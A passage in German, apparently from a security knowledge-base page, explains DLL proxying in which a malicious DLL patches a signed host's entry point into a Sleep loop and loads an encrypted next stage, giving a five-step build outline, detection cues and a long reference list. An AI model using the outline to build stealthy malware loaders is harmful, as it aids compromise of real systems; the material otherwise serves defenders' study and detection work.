- Nach dem Laden patcht die schädliche DLL den Einstiegspunkt des Hosts, sodass der Hauptthread in eine Endlosschleife mit `Sleep` gerät, statt den Prozess zu beenden oder Codepfade auszuführen, die ihn beenden würden.
- Ein neuer Thread führt die eigentliche schädliche Aktion aus: Er entschlüsselt den Namen oder Pfad der nächsten DLL-Stufe (häufig mit RC4/XOR) und lädt sie anschließend mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL-Proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug aktiv bleibt, um spätere Stufen auszuführen.
- Den Hauptthread mit `Sleep(INFINITE)` anzuhalten, ist eine einfache Möglichkeit, den signierten Prozess resident zu halten, während der Loader in einem Worker-Thread Entschlüsselung, Staging oder Netzwerk-Bootstrap durchführt.
- Wer nur nach einer verdächtigen `DllMain` sucht, übersieht dieses Muster, wenn das interessante Verhalten erst auftritt, nachdem der Einstiegspunkt des Hosts gepatcht wurde und ein sekundärer Thread startet.

Minimaler Ablauf
1. Die signierte Host-EXE kopieren und ermitteln, welche DLL sie aus dem lokalen Verzeichnis lädt.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und sie an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. In diesem Thread den Einstiegspunkt des Hosts oder die Startfunktion des Hauptthreads so patchen, dass dieser in einer `Sleep`-Schleife läuft.
5. Den Namen/die Konfiguration der nächsten DLL-Stufe entschlüsseln und `LoadLibrary` aufrufen oder die Payload manuell mappen.

Ansatzpunkte für die Abwehr
- Signierte Prozesse, die `version.dll` oder ähnlich verbreitete Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicher-Patches am Prozesseinstiegspunkt kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Threads, die von einer Proxy-DLL erstellt werden und unmittelbar `LoadLibrary` mit einem entschlüsselten Namen auf eine zweite DLL aufrufen.
- Proxy-DLLs mit vollständigem Export-Satz, die neben Hersteller-EXEs in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt werden.

## References

- [1] [Red Canary – Erkenntnisse zur Bedrohungslage: Januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Privilege Escalation mit TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL-Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-Hijacking in Windows. Einfaches C-Beispiel.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore setzt neue Malware gegen Europa ein](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wenn DLL-Hijacks auf Windows-Hilfsprogramme treffen](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale Doppelgänger: Anatomie sich weiterentwickelnder Identitätsbetrugskampagnen, die Gh0st RAT verbreiten](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Konvergierende Interessen: Analyse von Bedrohungsclustern, die eine südostasiatische Regierung ins Visier nehmen](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-Backdoor: Ein genauer Blick auf das Toolkit von Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: ZipSlip → DLL-Hijack-Kette](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Verfolgung der Spionagekampagnen von Iranian APT Screening Serpens aus dem Jahr 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus-Manticore-Operationen während des iranischen Konflikts](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Aufgabenaktionen](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nimmt südostasiatische Regierungen und kritische Infrastruktur ins Visier](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Rekonstruktion und Erkennung von Windows-DLL-Suchreihenfolge-Hijacking mit Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Erstellen nativer Bibliotheken mit Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native Exporte mit Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE-Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Aufdeckung einer in legitimer Software eingebetteten SectopRAT-Variante](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOW stehlen (Teil eins)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
